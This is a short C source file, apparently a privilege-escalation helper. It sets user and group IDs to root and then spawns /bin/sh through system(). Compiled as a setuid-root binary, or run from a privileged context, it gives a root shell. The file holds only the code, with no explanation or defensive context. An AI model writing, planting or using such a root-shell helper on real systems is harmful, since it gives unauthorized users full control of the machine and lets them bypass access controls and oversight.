#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
	setuid(0);
	setgid(0);
	seteuid(0);
	setegid(0);
	
	system("/bin/sh");
	return 0;
}
